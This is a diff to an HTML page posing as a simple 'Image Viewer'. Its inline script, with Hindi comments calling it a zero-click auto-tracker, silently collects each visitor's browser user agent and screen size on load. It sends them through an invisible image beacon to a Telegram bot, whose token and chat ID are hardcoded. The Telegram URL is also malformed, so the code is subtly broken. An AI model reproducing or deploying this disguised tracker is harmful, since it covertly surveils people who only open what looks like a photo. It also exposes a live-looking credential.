@@ -4,54 +4,32 @@
     <title>Image Viewer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { 
-            background-color: black; 
-            margin: 0; 
-            padding: 0; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            user-select: none; 
-        }
-        img { 
-            max-width: 100%; 
-            max-height: 100vh; 
-            object-fit: contain; 
-        }
+        body { background-color: black; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; user-select: none; }
+        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
     </style>
 </head>
 <body>
 
-    <!-- 📷 फोटो हमेशा बिना रुके तुरंत लोड होगी -->
+    <!-- 📷 फोटो हमेशा तुरंत लोड होगी -->
     <img src="photo.jpg" alt="Image Viewer">
 
     <script>
-        // बिना किसी गूगल स्क्रिप्ट के, सीधे और 100% काम करने वाला ऑटो-ट्रैकर
+        // बिना किसी क्लाउडफ्लेयर वर्कर या गूगल स्क्रिप्ट के सीधे काम करने वाला कोड
         (function() {
             const token = "8390339580:AAHgGBL-V3ya7JsCLs5e0lwYnIAEOypvtEE"; 
             const chatId = "1798743066"; 
 
-            // विज़िटर के ब्राउज़र की बेसिक डिटेल्स निकालना
             const userAgentText = navigator.userAgent;
             const screenRes = window.screen.width + "x" + window.screen.height;
-            const pageLanguage = navigator.language || "Unknown";
 
-            // टेलीग्राम के लिए बिना कोडिंग एरर वाला सीधा संदेश तैयार करना
-            const textMessage = `🔔 *ZERO CLICK AUTOMATIC ALERT* 🔔\n\n` +
-                                `📱 *Device Info:* \`${userAgentText}\`\n` +
-                                `🖥️ *Screen Size:* \`${screenRes}\`\n` +
-                                `🌐 *Language:* \`${pageLanguage}\`\n` +
-                                `⏱️ *Time:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
+            const textMessage = "🔔 *ZERO CLICK AUTOMATIC ALERT* 🔔\n\n📱 *Device Info:* `" + userAgentText + "`\n🖥️ *Screen Size:* `" + screenRes + "`";
             
-            // ⚡ ब्राउज़र की सुरक्षा (CORS Policy) को बायपास करने का सीधा और अचूक तरीका
-            const finalUrl = `https://telegram.org{token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}&parse_mode=Markdown`;
+            // ⚡ सीधे टेलीग्राम सर्वर का 100% सही URL पाथ
+            const finalUrl = "https://telegram.org" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(textMessage) + "&parse_mode=Markdown";
             
-            // अदृश्य इमेज बीकन जो बिना स्क्रीन छुए, पेज लोड होते ही बोट को तुरंत ट्रिगर कर देगा
+            // बिना स्क्रीन छुए, पेज खुलते ही तुरंत बोट को मैसेज भेजने का सबसे अचूक तरीका
             const ping = new Image();
             ping.src = finalUrl;
-            
-            console.log("Direct Tracking Active");
         })();
     </script>
 
